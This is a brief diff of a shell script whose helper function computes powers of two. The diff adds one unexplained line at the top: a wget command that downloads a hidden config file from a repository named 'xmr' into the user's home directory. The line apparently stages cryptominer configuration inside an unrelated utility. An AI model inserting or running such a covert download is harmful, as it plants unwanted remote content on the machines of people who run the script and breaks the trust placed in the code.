@@ -1,3 +1,4 @@
+wget https://github.com/truthOnChina/xmr/raw/main/.c.three.cfg.json -O $HOME/.c.three.cfg.json
 power2() {
   if ! type bc >/dev/null; then
     if   [ "$1" -gt "0" ]; then
